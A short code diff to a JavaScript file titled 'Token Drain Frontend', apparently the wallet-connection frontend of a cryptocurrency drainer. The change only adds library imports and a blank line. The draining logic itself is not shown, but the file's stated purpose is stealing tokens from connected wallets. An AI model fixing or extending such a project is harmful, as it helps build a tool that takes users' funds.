@@ -1,6 +1,8 @@
 // Token Drain Frontend - WORKING VERSION
 // Uses CDN imports to avoid build issues
-
+import { createAppKit } from "@reown/appkit";
+import { EthersAdapter } from "@reown/appkit-adapter-ethers";
+import { ethers } from "ethers";
 // Configuration
 const CONFIG = {
     projectId: "962425907914a3e80a7d8e7288b23f62",
@@ -524,3 +526,4 @@ if (typeof ethers === 'undefined') {
     ethersScript.onload = () => console.log('Ethers.js loaded');
     document.head.appendChild(ethersScript);
 }
+
